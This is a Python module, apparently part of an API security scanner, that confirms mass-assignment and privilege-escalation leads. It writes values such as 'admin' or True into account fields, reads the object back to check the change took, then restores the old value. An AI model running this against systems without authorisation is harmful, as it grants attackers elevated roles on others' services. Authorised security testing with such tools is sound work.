from __future__ import annotations

from dataclasses import dataclass
from typing import Any
from urllib.parse import urlsplit, urlunsplit

from . import mutate
from .client import Client, Request
from .model import Schema
from .triage import Lead

_COMMON_READ = ["/api/me", "/api/user", "/api/users/me", "/api/account",
                "/api/profile", "/me", "/account", "/profile"]


@dataclass
class Confirmation:
    path: str
    category: str
    value: Any
    read_url: str


class Confirm:
    def __init__(self, client: Client, write: Request, schema: Schema,
                 encoding: str = "json", read_url: str | None = None):
        self.client = client
        self.write = write
        self.schema = schema
        self.encoding = encoding
        self.read_url = read_url
        self.sent = 0
        self.read_endpoint: str | None = None

    def run(self, leads: list[Lead]) -> tuple[list[Confirmation], str | None]:
        read, baseline = self._establish_read()
        if read is None:
            return [], None
        self.read_endpoint = read.url

        confirmed: list[Confirmation] = []
        for lead in leads:
            if lead.category not in ("privesc", "mass-assign"):
                continue
            path = lead.path.split(".")
            attack = self._attack_value(lead)
            before = _nav(baseline, path)
            if _same(before, attack):
                continue

            # set the field then read the object back and only keep it if the value actually stuck
            self._write(path, attack, baseline)
            after = self._http_get(read.url)
            if isinstance(after, dict) and _same(_nav(after, path), attack):
                confirmed.append(Confirmation(lead.path, lead.category, attack, read.url))

            if before is not None:
                # put the value back the way we found it
                self._write(path, before, baseline)
        return confirmed, self.read_endpoint

    def _establish_read(self) -> tuple[Request | None, dict]:
        known = set(self.schema.root.children)
        candidates = []
        if self.read_url:
            candidates.append(self.read_url)
        candidates.append(self.write.url)
        origin = _origin(self.write.url)
        candidates += [origin + path for path in _COMMON_READ]

        for url in candidates:
            data = self._http_get(url)
            if isinstance(data, dict) and known & _keys(data):
                return Request("GET", url, dict(self.write.headers), ""), data
        return None, {}

    def _http_get(self, url: str):
        try:
            resp = self.client.get(url, self.write.headers)
            self.sent += 1
            return resp.json()
        except Exception:
            return None

    def _write(self, path: list[str], value: Any, baseline: dict) -> None:
        body: dict[str, Any] = {}
        for name, child in self.schema.root.children.items():
            if child.required:
                base = _nav(baseline, [name])
                body[name] = base if base is not None else mutate.valid_value(child)
        _set(body, path, value)
        try:
            self.client.send(self.write, body, self.encoding)
            self.sent += 1
        except Exception:
            pass

    def _attack_value(self, lead: Lead) -> Any:
        node = self.schema.node_at(lead.path.split("."))
        if node.enum:
            for pick in ("admin", "superuser", "root", "staff"):
                if pick in node.enum:
                    return pick
            return node.enum[-1]
        return True


def _nav(data: Any, path: list[str]) -> Any:
    for part in path:
        if not isinstance(data, dict) or part not in data:
            return None
        data = data[part]
    return data


def _set(body: dict, path: list[str], value: Any) -> None:
    cursor = body
    for part in path[:-1]:
        cursor = cursor.setdefault(part, {})
    cursor[path[-1]] = value


def _keys(data: dict) -> set[str]:
    return set(data.keys())


def _same(a: Any, b: Any) -> bool:
    if a is None:
        return False
    return str(a).strip().lower() == str(b).strip().lower()


def _origin(url: str) -> str:
    parts = urlsplit(url)
    return urlunsplit((parts.scheme, parts.netloc, "", "", ""))
